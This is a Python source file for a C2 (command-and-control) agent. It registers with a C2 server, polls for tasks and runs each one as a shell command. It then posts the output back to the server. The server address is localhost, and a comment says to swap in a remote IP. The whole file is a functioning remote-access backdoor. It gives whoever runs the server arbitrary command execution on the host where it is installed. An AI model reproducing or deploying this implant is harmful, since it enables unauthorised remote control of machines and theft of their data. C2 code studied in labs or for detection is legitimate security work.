import requests
import socket
import time
import uuid
import subprocess

C2_URL = "http://127.0.0.1:5001"  # Replace with C2 server IP if remote
REGISTER_ENDPOINT = f"{C2_URL}/register"
TASK_ENDPOINT = f"{C2_URL}/task"
REPORT_ENDPOINT = f"{C2_URL}/report"

# Generate or reuse a persistent agent ID
def get_agent_id():
    try:
        with open("agent_id.txt", "r") as f:
            return f.read().strip()
    except FileNotFoundError:
        agent_id = str(uuid.uuid4())
        with open("agent_id.txt", "w") as f:
            f.write(agent_id)
        return agent_id

def register():
    hostname = socket.gethostname()
    payload = {
        "hostname": hostname,
        "tags": ["localnet", "test"]
    }
    print("[*] Registering with C2...")
    res = requests.post(REGISTER_ENDPOINT, json=payload)
    if res.status_code == 200:
        agent_id = res.json().get("agent_id")
        with open("agent_id.txt", "w") as f:
            f.write(agent_id)
        print(f"[+] Registered successfully: {agent_id}")
        return agent_id
    else:
        print("[!] Registration failed.")
        return None

def poll_task(agent_id):
    try:
        res = requests.get(f"{TASK_ENDPOINT}/{agent_id}")
        if res.status_code == 404:
            print("[!] Agent not found by C2. Re-registering...")
            return "RE-REGISTER"
        if res.status_code == 200:
            return res.json().get("task")
        return None
    except Exception as e:
        print(f"[!] Task poll failed: {e}")
        return None

def run_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        return result.stdout + result.stderr
    except Exception as e:
        return f"Error: {e}"

def send_result(agent_id, output):
    try:
        res = requests.post(REPORT_ENDPOINT, json={"agent_id": agent_id, "output": output})
        if res.status_code == 200:
            print("[>] Result sent.")
    except Exception as e:
        print(f"[!] Failed to send result: {e}")

def main():
    agent_id = get_agent_id()
    if not agent_id:
        agent_id = register()
        if not agent_id:
            print("[!] Failed to register. Exiting.")
            return

    while True:
        task = poll_task(agent_id)
        if task == "RE-REGISTER":
            agent_id = register()
            if not agent_id:
                print("[!] Failed to re-register. Retrying in 10s.")
                time.sleep(10)
                continue
        elif task:
            print(f"[~] Received task: {task}")
            result = run_command(task)
            send_result(agent_id, result)
        time.sleep(5)

if __name__ == "__main__":
    main()

